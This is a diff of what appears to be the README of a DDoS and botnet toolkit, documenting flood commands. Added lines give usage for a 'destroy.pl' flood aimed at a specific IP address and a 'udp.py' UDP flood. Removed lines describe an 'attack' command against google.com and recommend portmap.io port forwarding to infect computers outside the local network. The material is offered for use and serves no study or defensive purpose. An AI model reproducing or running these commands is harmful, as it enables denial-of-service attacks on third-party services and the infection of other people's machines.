@@ -3,16 +3,12 @@
 $ Destroy 
 
 perl destroy.pl 76.223.105.230 80 65500 50000000000
+Usage: destroy <ip> <port> <time>
+Example: destroy 1.1.1.1 80 60
 
 $ UDP
 
-This command make the DDoS Attack, Example:
+python2 udp.py {ip} {port} 0 0
+Usage: udp <ip> <port>
+Example: udp 1.1.1.1 80
 
-attack google.com 1000 [Number of requests] 120 [Threads]
-
-Dont enter http / https, just the host
-
-
-# How to use Out-Lan
-
-There is a tool called portmap.io which can be used to do portforwading and be able to infect computers that are not on your same network. I recommend you look at it
